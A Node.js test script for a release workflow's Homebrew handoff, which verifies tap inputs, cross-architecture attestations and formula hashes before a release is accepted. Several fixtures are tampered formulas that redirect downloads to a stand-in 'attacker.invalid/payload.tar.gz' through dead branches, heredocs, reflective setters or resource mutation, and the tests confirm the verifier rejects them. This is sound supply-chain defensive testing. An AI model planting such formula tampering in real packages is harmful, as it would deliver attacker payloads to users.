#!/usr/bin/env node

import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const workflowPath = fileURLToPath(new URL('../.github/workflows/release-go-cli.yml', import.meta.url));
const rubyExtractor = String.raw`
  workflow = Psych.safe_load(
    File.read(ARGV.fetch(0)),
    permitted_classes: [],
    permitted_symbols: [],
    aliases: false
  )
  inputs_step = workflow.fetch('jobs').fetch('validate').fetch('steps').find do |candidate|
    candidate['name'] == 'Validate inputs'
  end
  handoff_step = workflow.fetch('jobs').fetch('handoff').fetch('steps').find do |candidate|
    candidate['name'] == 'Dispatch configured tap and verify formula hashes'
  end
  abort 'input or handoff step not found' unless inputs_step && handoff_step
  print JSON.generate(inputs: inputs_step.fetch('run'), handoff: handoff_step.fetch('with').fetch('script'))
`;
const extracted = JSON.parse(execFileSync(
  'ruby',
  ['-rpsych', '-rjson', '-e', rubyExtractor, workflowPath],
  { encoding: 'utf8' },
));
const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
const executeHandoff = new AsyncFunction('github', 'context', 'core', 'process', 'require', extracted.handoff);
const require = createRequire(import.meta.url);

const repository = 'openclaw/spogo';
const tag = 'v1.2.3';
const targetSha = 'a'.repeat(40);
const runId = '29640000000';
const runAttempt = '1';
const verificationPayloadArtifact = `release-verification-payload-${runId}-${runAttempt}`;
const artifactData = new Map([
  ['spogo_1.2.3_spogo_darwin_darwin_amd64_v1.tar.gz', Buffer.from('darwin-amd64')],
  ['spogo_1.2.3_spogo_darwin_darwin_arm64_v8.0.tar.gz', Buffer.from('darwin-arm64')],
  ['spogo_1.2.3_darwin+debug.tar.gz', Buffer.from('darwin-debug')],
  ['spogo_1.2.3_spogo_linux_amd64_v1.tar.gz', Buffer.from('linux-amd64')],
  ['spogo_1.2.3_spogo_linux_arm64_v8.0.tar.gz', Buffer.from('linux-arm64')],
]);
const targetNames = {
  darwin_amd64: 'spogo_1.2.3_spogo_darwin_darwin_amd64_v1.tar.gz',
  darwin_arm64: 'spogo_1.2.3_spogo_darwin_darwin_arm64_v8.0.tar.gz',
  linux_amd64: 'spogo_1.2.3_spogo_linux_amd64_v1.tar.gz',
  linux_arm64: 'spogo_1.2.3_spogo_linux_arm64_v8.0.tar.gz',
};

function digest(data) {
  return createHash('sha256').update(data).digest('hex');
}

const sha256sums = [...artifactData]
  .sort(([left], [right]) => left.localeCompare(right))
  .map(([name, data]) => `${digest(data)}  ${name}\n`)
  .join('');
const assetInventory = `${JSON.stringify({
  schemaVersion: 1,
  repository,
  tag,
  commit: targetSha,
  payloads: [...artifactData].map(([name, data]) => ({
    name,
    size: data.length,
    sha256: digest(data),
    ...Object.fromEntries(Object.entries(targetNames).filter(([, targetName]) => targetName === name).map(([target]) => ['target', target])),
  })),
}, null, 2)}\n`;
const dispatchedAssets = Object.fromEntries(Object.entries(targetNames).map(([target, name]) => [target, {
  name,
  sha256: digest(artifactData.get(name)),
}]));

function resolveInputs({
  buildRunner = 'ubuntu',
  formula = 'spogo',
  homebrewTap = '',
  nfpmMode = 'auto',
  repositoryType,
}) {
  const fixtureRoot = mkdtempSync(join(tmpdir(), 'release-homebrew-inputs-'));
  const githubOutput = join(fixtureRoot, 'github-output');
  let thrown;
  try {
    execFileSync('bash', ['-e', '-u', '-o', 'pipefail', '-c', extracted.inputs], {
      encoding: 'utf8',
      env: {
        ...process.env,
        BUILD_RUNNER: buildRunner,
        EXTRA_PACKAGES: '[]',
        GITHUB_OUTPUT: githubOutput,
        HOMEBREW_FORMULA: formula,
        HOMEBREW_TAP: homebrewTap,
        NFPM_MODE: nfpmMode,
        REPOSITORY_TYPE: repositoryType,
        VERSION: '1.2.3',
      },
      stdio: 'pipe',
    });
  } catch (error) {
    thrown = error;
  }
  const output = thrown ? '' : readFileSync(githubOutput, 'utf8');
  rmSync(fixtureRoot, { recursive: true, force: true });
  return { output, stderr: thrown?.stderr?.toString() ?? '', thrown };
}

function formulaFor(overrides = {}) {
  const bindings = [...artifactData].map(([name, data]) => {
    const observed = overrides[name] ?? digest(data);
    return `  url "https://github.com/${repository}/releases/download/${tag}/${name}"\n  sha256 "${observed}"`;
  });
  return `class Spogo < Formula\n${bindings.join('\n')}\nend\n`;
}

function platformMatrixFormula() {
  const sha = (name) => digest(artifactData.get(name));
  return `class Spogo < Formula
  desc "Fixture"
  homepage "https://github.com/${repository}"
  version "1.2.3"
  license "MIT"
  head "https://github.com/${repository}.git", branch: "main"

  on_macos do
    if Hardware::CPU.arm?
      url "https://github.com/${repository}/releases/download/${tag}/${targetNames.darwin_arm64}"
      sha256 "${sha(targetNames.darwin_arm64)}"
    else
      url "https://github.com/${repository}/releases/download/${tag}/${targetNames.darwin_amd64}"
      sha256 "${sha(targetNames.darwin_amd64)}"
    end
  end

  on_linux do
    if Hardware::CPU.arm?
      url "https://github.com/${repository}/releases/download/${tag}/${targetNames.linux_arm64}"
      sha256 "${sha(targetNames.linux_arm64)}"
    else
      url "https://github.com/${repository}/releases/download/${tag}/${targetNames.linux_amd64}"
      sha256 "${sha(targetNames.linux_amd64)}"
    end
  end

  depends_on "go" => :build if build.head?

  def install
    bin.install "spogo"
  end

  test do
    assert_match "spogo", shell_output("#{bin}/spogo --help")
  end
end
`;
}

function baseAttestations() {
  return Object.fromEntries(['arm64', 'x86_64'].map((architecture) => [architecture, {
    schemaVersion: 1,
    repository,
    runId,
    verifierRunAttempt: runAttempt,
    payloadArtifact: verificationPayloadArtifact,
    tag,
    commit: targetSha,
    architecture,
    verdict: 'verified',
    assetInventory,
    releaseNotes: '## v1.2.3 - 2026-07-18\n',
    sha256sums,
  }]));
}

async function runHandoff({
  additionalMatchingRun = false,
  formulas = [formulaFor()],
  homebrewTap = 'steipete/homebrew-tap',
  mutateAttestations = () => {},
  repositoryError,
  runConclusion = 'success',
  runStartsQueued = false,
  tapFullName = homebrewTap,
  tapTokenPresent = true,
  workflowState = 'active',
} = {}) {
  const fixtureRoot = mkdtempSync(join(tmpdir(), 'release-homebrew-handoff-'));
  const originalCwd = process.cwd();
  const attestations = baseAttestations();
  mutateAttestations(attestations);
  for (const architecture of ['arm64', 'x86_64']) {
    const directory = join(fixtureRoot, 'verified-inventory-attestations', architecture);
    mkdirSync(directory, { recursive: true });
    writeFileSync(
      join(directory, 'verified-inventory-attestation.json'),
      JSON.stringify(attestations[architecture]),
    );
  }

  const dispatches = [];
  const failures = [];
  const info = [];
  const events = [];
  let formulaReads = 0;
  let dispatched = false;
  let tapRun = {
    actor: { login: 'steipete' },
    conclusion: runStartsQueued ? null : runConclusion,
    display_title: `Update spogo for ${tag}`,
    html_url: 'https://example.test/tap-run/42',
    id: 42,
    status: runStartsQueued ? 'queued' : 'completed',
  };
  const [tapOwner, tapRepo] = homebrewTap.split('/');
  const github = {
    rest: {
      actions: {
        createWorkflowDispatch: async (request) => {
          dispatches.push(request);
          dispatched = true;
          events.push('dispatch');
        },
        getWorkflowRun: async () => {
          tapRun = { ...tapRun, conclusion: runConclusion, status: 'completed' };
          events.push('run-completed');
          return { data: tapRun };
        },
        getWorkflow: async () => ({ data: { state: workflowState } }),
        listWorkflowRuns: async () => {
          if (!dispatched) return { data: { workflow_runs: [{ id: 1 }] } };
          const runs = [tapRun];
          if (additionalMatchingRun) runs.push({ ...tapRun, id: 43 });
          return { data: { workflow_runs: runs } };
        },
      },
      repos: {
        get: async () => {
          if (repositoryError) throw repositoryError;
          return { data: { default_branch: 'main', full_name: tapFullName } };
        },
        getContent: async () => {
          events.push('formula-read');
          const source = formulas[Math.min(formulaReads, formulas.length - 1)];
          formulaReads += 1;
          if (source instanceof Error) throw source;
          return {
            data: {
              content: Buffer.from(source).toString('base64'),
              encoding: 'base64',
              type: 'file',
            },
          };
        },
      },
      users: {
        getAuthenticated: async () => ({ data: { login: 'steipete' } }),
      },
    },
  };
  const context = { repo: { owner: 'openclaw', repo: 'spogo' }, runId };
  const core = {
    info: (message) => info.push(message),
    setFailed: (message) => failures.push(message),
  };
  let thrown;
  try {
    process.chdir(fixtureRoot);
    await executeHandoff(github, context, core, {
      env: {
        FORMULA: 'spogo',
        HOMEBREW_POLL_INTERVAL_MS: '0',
        HOMEBREW_POLL_TIMEOUT_MS: formulas.length > 1 || runStartsQueued ? '5000' : '0',
        HOMEBREW_TAP: homebrewTap,
        PATH: process.env.PATH,
        SOURCE_DEFAULT_BRANCH: 'main',
        TAG: tag,
        TAP_TOKEN_PRESENT: String(tapTokenPresent),
        TARGET_SHA: targetSha,
        VERIFICATION_PAYLOAD_ARTIFACT: verificationPayloadArtifact,
      },
    }, require);
  } catch (error) {
    thrown = error;
  } finally {
    process.chdir(originalCwd);
    rmSync(fixtureRoot, { recursive: true, force: true });
  }
  return { dispatches, events, failures, formulaReads, info, tapOwner, tapRepo, thrown };
}

const inputMatrix = [
  ['openclaw default tap', { repositoryType: 'openclaw' }, 'openclaw/homebrew-tap'],
  ['personal default tap', { repositoryType: 'personal' }, 'steipete/homebrew-tap'],
  ['Foundation signer with personal tap override', { repositoryType: 'openclaw', homebrewTap: 'steipete/homebrew-tap' }, 'steipete/homebrew-tap'],
  ['personal signer with Foundation tap override', { repositoryType: 'personal', homebrewTap: 'openclaw/homebrew-tap' }, 'openclaw/homebrew-tap'],
];
for (const [name, fixture, expectedTap] of inputMatrix) {
  const result = resolveInputs(fixture);
  assert.equal(result.thrown, undefined);
  assert.match(result.output, new RegExp(`^homebrew-tap=${expectedTap.replace('/', '\\/')}$`, 'm'));
  console.log(`PASS ${name}`);
}

for (const [name, fixture, expectedError] of [
  ['invalid tap name fails closed', { repositoryType: 'openclaw', homebrewTap: 'steipete' }, /owner\/repo/],
  ['unsafe formula name fails closed', { repositoryType: 'openclaw', formula: '../spogo' }, /formula filename stem/],
  ['invalid build runner fails closed', { repositoryType: 'openclaw', buildRunner: 'windows' }, /build-runner must be ubuntu or macos/],
  ['invalid nFPM mode fails closed', { repositoryType: 'openclaw', nfpmMode: 'maybe' }, /nfpm must be auto, enabled, or disabled/],
]) {
  const result = resolveInputs(fixture);
  assert.notEqual(result.thrown, undefined);
  assert.match(result.stderr, expectedError);
  console.log(`PASS ${name}`);
}

{
  const result = await runHandoff();
  assert.equal(result.thrown, undefined);
  assert.deepEqual(result.failures, []);
  assert.equal(result.dispatches.length, 1);
  assert.deepEqual(result.dispatches[0], {
    owner: 'steipete',
    repo: 'homebrew-tap',
    workflow_id: 'update-formula.yml',
    ref: 'main',
    inputs: { formula: 'spogo', tag, repository, assets: JSON.stringify(dispatchedAssets) },
  });
  assert.ok(result.info.some((message) => /verified steipete\/homebrew-tap\/Formula\/spogo\.rb assets/.test(message)));
  console.log('PASS exact live dispatch contract and verified formula');
}

{
  const stale = formulaFor(Object.fromEntries([...artifactData].map(([name]) => [name, '0'.repeat(64)])));
  const result = await runHandoff({ formulas: [stale, formulaFor()] });
  assert.equal(result.thrown, undefined);
  assert.equal(result.formulaReads, 2);
  console.log('PASS stale formula polls until verified hashes appear');
}

{
  const result = await runHandoff({ runStartsQueued: true });
  assert.equal(result.thrown, undefined);
  assert.ok(result.events.indexOf('run-completed') < result.events.indexOf('formula-read'));
  console.log('PASS formula verification waits for the dispatched tap run');
}

{
  const result = await runHandoff({ runConclusion: 'failure' });
  assert.match(result.thrown?.message, /tap workflow .* concluded failure/);
  assert.equal(result.formulaReads, 0);
  console.log('PASS failed tap run blocks formula acceptance');
}

{
  const result = await runHandoff({ additionalMatchingRun: true });
  assert.match(result.thrown?.message, /dispatch correlation is ambiguous/);
  assert.equal(result.formulaReads, 0);
  console.log('PASS concurrent identical tap runs fail closed');
}

{
  const firstAsset = artifactData.keys().next().value;
  const result = await runHandoff({ formulas: [formulaFor({ [firstAsset]: 'f'.repeat(64) })] });
  assert.match(result.thrown?.message, /timed out.*sha256 mismatch/);
  assert.equal(result.dispatches.length, 1);
  console.log('PASS successful dispatch cannot bypass formula hash mismatch');
}

{
  const first = [...artifactData][0];
  const decoy = `class Spogo < Formula\n  if false\n    url "https://github.com/${repository}/releases/download/${tag}/${first[0]}"\n    sha256 "${digest(first[1])}"\n  end\n  url("https://attacker.invalid/payload.tar.gz")\n  sha256("${'f'.repeat(64)}")\nend\n`;
  const result = await runHandoff({ formulas: [decoy] });
  assert.match(result.thrown?.message, /timed out.*violates closed load-time grammar/);
  console.log('PASS inactive decoy cannot hide alternate URL setter syntax');
}

{
  const first = [...artifactData][0];
  const heredoc = `class Spogo < Formula\n  EXAMPLE = <<~RUBY\n    url "https://github.com/${repository}/releases/download/${tag}/${first[0]}"\n    sha256 "${digest(first[1])}"\n  RUBY\n  public_send("url", "https://attacker.invalid/payload.tar.gz")\nend\n`;
  const result = await runHandoff({ formulas: [heredoc] });
  assert.match(result.thrown?.message, /timed out.*violates closed load-time grammar/);
  console.log('PASS heredoc decoy and reflective setter fail closed');
}

{
  const mutation = formulaFor().replace(
    '\nend\n',
    '\n  stable.instance_variable_get(:@resource).instance_variable_set(:@url, "https://attacker.invalid/payload.tar.gz")\nend\n',
  );
  const result = await runHandoff({ formulas: [mutation] });
  assert.match(result.thrown?.message, /timed out.*violates closed load-time grammar/);
  console.log('PASS direct stable-resource mutation fails closed');
}

{
  const withHead = formulaFor().replace(
    'class Spogo < Formula\n',
    `class Spogo < Formula\n  head "https://github.com/${repository}.git", branch: "main"\n`,
  );
  const result = await runHandoff({ formulas: [withHead] });
  assert.equal(result.thrown, undefined);
  console.log('PASS exact source-repository head is accepted');
}

{
  const result = await runHandoff({ formulas: [platformMatrixFormula()] });
  assert.equal(result.thrown, undefined);
  console.log('PASS live platform-matrix grammar is accepted');
}

{
  const escapedUrl = formulaFor().replace(
    'https://github.com/openclaw/spogo/releases/download/',
    'https:\\\\github.com\\openclaw\\spogo\\releases\\download\\',
  );
  const result = await runHandoff({ formulas: [escapedUrl] });
  assert.match(result.thrown?.message, /timed out.*violates closed load-time grammar/);
  console.log('PASS Ruby URL escapes fail closed');
}

{
  const customPort = formulaFor().replace('https://github.com/', 'https://github.com:444/');
  const result = await runHandoff({ formulas: [customPort] });
  assert.match(result.thrown?.message, /timed out.*not an exact .* release asset/);
  console.log('PASS nonstandard GitHub URL authority fails closed');
}

{
  const duplicateSeparator = formulaFor().replace('/releases/download/', '/releases//download/');
  const result = await runHandoff({ formulas: [duplicateSeparator] });
  assert.match(result.thrown?.message, /timed out.*not an exact .* release asset/);
  console.log('PASS noncanonical release path fails closed');
}

{
  const encodedSeparator = formulaFor().replace(
    `/${targetNames.darwin_amd64}`,
    `/nested%2F${targetNames.darwin_amd64}`,
  );
  const result = await runHandoff({ formulas: [encodedSeparator] });
  assert.match(result.thrown?.message, /timed out.*not an exact .* release asset/);
  console.log('PASS encoded path separator fails closed');
}

{
  const withBadHead = formulaFor().replace(
    'class Spogo < Formula\n',
    'class Spogo < Formula\n  head "https://attacker.invalid/spogo.git", branch: "main"\n',
  );
  const result = await runHandoff({ formulas: [withBadHead] });
  assert.match(result.thrown?.message, /timed out.*head is not the exact source repository default branch/);
  console.log('PASS alternate head fetch fails closed');
}

{
  const result = await runHandoff({
    mutateAttestations: (attestations) => { attestations.x86_64.sha256sums += '\n'; },
  });
  assert.match(result.thrown?.message, /differs between arm64 and x86_64/);
  assert.equal(result.dispatches.length, 0);
  console.log('PASS architecture attestation disagreement blocks dispatch');
}

{
  const result = await runHandoff({
    mutateAttestations: (attestations) => {
      const changed = JSON.parse(attestations.x86_64.assetInventory);
      changed.payloads[0].target = 'linux_amd64';
      attestations.x86_64.assetInventory = `${JSON.stringify(changed)}\n`;
    },
  });
  assert.match(result.thrown?.message, /asset inventory differs between arm64 and x86_64/);
  assert.equal(result.dispatches.length, 0);
  console.log('PASS architecture inventory disagreement blocks dispatch');
}

{
  const result = await runHandoff({
    mutateAttestations: (attestations) => {
      for (const attestation of Object.values(attestations)) {
        const changed = JSON.parse(attestation.assetInventory);
        delete changed.payloads.find((payload) => payload.target === 'linux_arm64').target;
        attestation.assetInventory = `${JSON.stringify(changed)}\n`;
      }
    },
  });
  assert.match(result.thrown?.message, /lacks Homebrew assets: linux_arm64/);
  assert.equal(result.dispatches.length, 0);
  console.log('PASS incomplete explicit-assets inventory blocks dispatch');
}

{
  const denied = Object.assign(new Error('not found'), { status: 404 });
  const result = await runHandoff({ repositoryError: denied });
  assert.match(result.thrown?.message, /TAP_TOKEN cannot access configured Homebrew tap steipete\/homebrew-tap \(HTTP 404\)/);
  assert.equal(result.dispatches.length, 0);
  console.log('PASS TAP_TOKEN is validated against configured tap');
}

{
  const result = await runHandoff({ tapTokenPresent: false });
  assert.deepEqual(result.failures, ['TAP_TOKEN is required when homebrew-formula is set']);
  assert.equal(result.dispatches.length, 0);
  console.log('PASS missing TAP_TOKEN fails before tap access');
}

console.log(`Homebrew handoff tests passed (${inputMatrix.length + 23} scenarios)`);
